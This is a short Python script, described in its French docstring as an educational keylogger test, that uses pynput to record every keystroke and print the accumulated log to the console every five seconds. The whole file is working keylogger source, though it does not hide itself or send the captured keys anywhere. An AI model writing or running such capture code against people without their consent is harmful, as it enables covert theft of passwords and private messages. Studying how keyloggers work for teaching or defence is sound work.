import pynput
import threading
""" Test de keylogger a but educatif 
Lecture du code et comenter les fonctions
"""

class Keylooger:
    def __init__(self):
        self.log = ""

    def append_log (self, string):
        self.log = self.log + string

    def process_key_press(self,key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_log(current_key)

    def report(self):
        print (self.log)
        self.log = " "
        timer = threading.Timer(5, self.report)
        timer.start()
    def start(self):
        keyboard_listenear = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listenear:
            self.report()
            keyboard_listenear.join()

a = Keylooger()
a.start()